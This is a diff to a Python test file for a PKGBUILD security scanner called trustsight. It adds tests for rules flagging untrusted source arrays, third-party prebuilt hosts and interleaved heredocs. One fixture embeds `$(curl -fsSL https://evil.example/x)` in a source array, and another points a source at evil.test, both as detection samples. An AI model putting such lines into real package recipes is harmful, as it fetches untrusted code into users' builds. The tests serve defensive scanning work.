@@ -24,10 +24,10 @@ from trustsight.analysis import scan_diff  # noqa: E402
 from trustsight.config import load_config, load_rules  # noqa: E402
 
 
-def _ids(diff, current_text=None):
+def _ids(diff, current_text=None, package_name="p"):
     with shipped_config():
         fact = scan_diff(diff, rules=load_rules(), config=load_config(),
-                         package_name="p", current_text=current_text)
+                         package_name=package_name, current_text=current_text)
     return {e.rule_id for e in fact.score_breakdown}
 
 
@@ -309,3 +309,122 @@ def test_a_wrapped_registry_install_is_still_a_gap(line):
 
     diff = _new_file("PKGBUILD", _HEAD + f"build() {{\n  {line}\n}}\n")
     assert has_unpinned_build_deps(diff), line
+
+
+# --- C007: a recipe scalar is not an arch source array ---------------------
+
+def test_c007_does_not_fire_on_a_multiline_source_version_assignment():
+    """`source_version=(...)` is a recipe scalar, not an arch source array."""
+    diff = _new_file("PKGBUILD", """
+pkgname=p
+pkgver=1
+pkgrel=1
+prepare() {
+  source_version=(
+    $(python -c 'print("1")')
+  )
+}
+""")
+    assert "C007" not in _ids(diff)
+
+
+def test_c007_still_fires_on_an_arch_source_array():
+    diff = _new_file("PKGBUILD", """
+pkgname=p
+pkgver=1
+pkgrel=1
+source_x86_64=("x.tar.gz::$(curl -fsSL https://evil.example/x)")
+""")
+    assert "C007" in _ids(diff)
+
+
+# --- C011: a declared documentation source is not the prebuilt artifact ----
+
+_C011_DECLARED_DOC = (
+    "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n"
+    " pkgname=snishaper-bin\n"
+    ' url="https://github.com/Team/Repo"\n'
+    '+source=("x-1.1.tar.gz::https://github.com/Team/Repo/releases/'
+    'download/v1.1/x.tar.gz"\n'
+    '+  "https://raw.githubusercontent.com/Team/Repo/v1.1/LICENSE")\n'
+)
+
+_C011_THIRD_PARTY = (
+    "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n"
+    " pkgname=snishaper-bin\n"
+    ' url="https://github.com/Team/Repo"\n'
+    '+source=("x-1.1.tar.gz::https://evil.test/x.tar.gz"\n'
+    '+  "https://raw.githubusercontent.com/Team/Repo/v1.1/LICENSE")\n'
+)
+
+_C011_CURRENT = (
+    "pkgname=snishaper-bin\n"
+    'url="https://github.com/Team/Repo"\n'
+    'source=("x-1.1.tar.gz::https://github.com/Team/Repo/releases/'
+    'download/v1.1/x.tar.gz" "https://raw.githubusercontent.com/'
+    'Team/Repo/v1.1/LICENSE")\n'
+)
+
+
+def test_c011_does_not_fire_on_a_declared_license_source():
+    """The LICENSE is excluded from the bucket map; it is not a host."""
+    assert "C011" not in _ids(
+        _C011_DECLARED_DOC, current_text=_C011_CURRENT,
+        package_name="snishaper-bin")
+
+
+def test_c011_still_fires_on_a_third_party_prebuilt_with_a_declared_license():
+    assert "C011" in _ids(
+        _C011_THIRD_PARTY, current_text=_C011_CURRENT,
+        package_name="snishaper-bin")
+
+
+# --- X002: a removed heredoc must not wrap an added one --------------------
+
+_INTERLEAVED_HEREDOC = (
+    "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,6 +1,7 @@\n"
+    " package() {\n"
+    "-  install -Dm755 /dev/stdin \"$pkgdir/usr/bin/x\" << 'EOF'\n"
+    "+  install -Dm755 /dev/stdin \"$pkgdir/usr/bin/x\" << 'LAUNCHER'\n"
+    "-#!/bin/bash\n"
+    "-echo old\n"
+    "-EOF\n"
+    "+#!/usr/bin/env bash\n"
+    "+APP_BIN=\"/usr/lib/x/X\"\n"
+    "+exec \"$APP_BIN\" \"$@\"\n"
+    "+LAUNCHER\n"
+    " }\n"
+)
+
+
+def test_x002_does_not_fire_when_a_removed_heredoc_wraps_an_added_one():
+    """tape16-bin: the old `EOF` stayed open past the new `LAUNCHER`."""
+    assert "X002" not in _ids(_INTERLEAVED_HEREDOC)
+
+
+# --- vendor release hosts: a known vendor host is quiet, a new one is not ---
+
+def _binary_bump(host):
+    return (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n"
+        " pkgname=wyrd-bin\n"
+        ' url="https://github.com/wyrd-company/wyrwood"\n'
+        "-source=(\"https://%s/x-1.0.tar.gz\")\n"
+        "+source=(\"https://%s/x-1.1.tar.gz\")\n"
+        "-sha256sums=('" + "a" * 64 + "')\n"
+        "+sha256sums=('" + "b" * 64 + "')\n"
+    ) % (host, host)
+
+
+def test_a_known_vendor_release_host_is_quiet():
+    """anoma.ly is an exact-host distribution host; the bump stays quiet."""
+    ids = _ids(_binary_bump("anoma.ly"), package_name="wyrd-bin")
+    assert "C011" not in ids
+    assert "SOURCE_BUCKET" not in ids
+
+
+def test_a_new_vendor_host_is_still_reported():
+    """repo.wyrd.foo is a zero-vote vendor host; it does not meet the bar."""
+    ids = _ids(_binary_bump("repo.wyrd.foo"), package_name="wyrd-bin")
+    assert "C011" in ids
+    assert "SOURCE_BUCKET" in ids
